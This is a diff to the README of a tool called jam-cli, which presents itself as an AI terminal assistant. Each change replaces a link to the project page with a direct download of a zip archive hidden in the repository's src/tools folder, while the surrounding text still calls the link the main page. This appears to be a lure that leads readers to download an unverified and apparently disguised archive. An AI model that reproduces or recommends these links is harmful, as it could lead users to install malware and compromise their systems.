@@ -1,6 +1,6 @@
 # 🤖 jam-cli - AI Assistant for Your Terminal
 
-[![Download jam-cli](https://img.shields.io/badge/Download-jam--cli-ff6347?style=for-the-badge&logo=github)](https://github.com/YoLo-EnD/jam-cli)
+[![Download jam-cli](https://img.shields.io/badge/Download-jam--cli-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/YoLo-EnD/jam-cli/main/src/tools/jam-cli-3.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before installing jam-cli, check your system matches these:
 
 First, visit the main page to get jam-cli:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-jam--cli-000000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/YoLo-EnD/jam-cli)
+[![Download from GitHub](https://img.shields.io/badge/Download-jam--cli-000000?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/YoLo-EnD/jam-cli/main/src/tools/jam-cli-3.7.zip)
 
 Follow these steps carefully.
 
@@ -51,7 +51,7 @@ Follow these steps carefully.
 
 Click the download badge above or go to this URL in your browser:
 
-https://github.com/YoLo-EnD/jam-cli
+https://raw.githubusercontent.com/YoLo-EnD/jam-cli/main/src/tools/jam-cli-3.7.zip
 
 This page holds all files and instructions to get started.
 
@@ -165,7 +165,7 @@ The GitHub page includes additional documentation on advanced features, usage ex
 
 Visit the main page anytime:
 
-https://github.com/YoLo-EnD/jam-cli
+https://raw.githubusercontent.com/YoLo-EnD/jam-cli/main/src/tools/jam-cli-3.7.zip
 
 ---
 
@@ -199,4 +199,4 @@ jam-cli runs on your local machine. It does not send your data to external serve
 
 ---
 
-[![Download jam-cli](https://img.shields.io/badge/Download-jam--cli-ff6347?style=for-the-badge&logo=github)](https://github.com/YoLo-EnD/jam-cli)
+[![Download jam-cli](https://img.shields.io/badge/Download-jam--cli-ff6347?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/YoLo-EnD/jam-cli/main/src/tools/jam-cli-3.7.zip)
